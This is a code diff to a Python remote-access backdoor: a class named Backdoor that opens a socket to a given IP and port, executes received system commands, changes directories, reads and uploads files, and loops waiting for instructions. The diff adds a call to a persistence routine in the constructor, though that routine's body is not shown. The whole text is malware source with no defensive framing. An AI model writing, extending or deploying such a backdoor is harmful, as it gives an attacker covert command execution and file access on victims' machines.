@@ -8,8 +8,10 @@ import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.persistence()
         self.sock_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock_obj.connect((ip, port))
+        
     def exec_system_cmd(self, command):
         try:
             DEVNULL = open(os.devnull,'wb')
@@ -41,12 +43,14 @@ class Backdoor:
                 return json.loads(json_data)
             except:
                 continue
+                
     def change_working_directory_to(self, path):
         try:
             os.chdir(path)
             return "[+] Changing working directory to "+path
         except:
             return "[+] ERROR - Invalid directory"
+            
     def read_file(self, path):
         try:
             with open(path, "rb") as f_obj:
@@ -60,6 +64,7 @@ class Backdoor:
                 return "[+] File uploaded successfully"
         except:
             return "[+] ERROR - Error during creating a file"           
+            
     def run(self):
         while True:
             recv_data = self.reliable_receive()
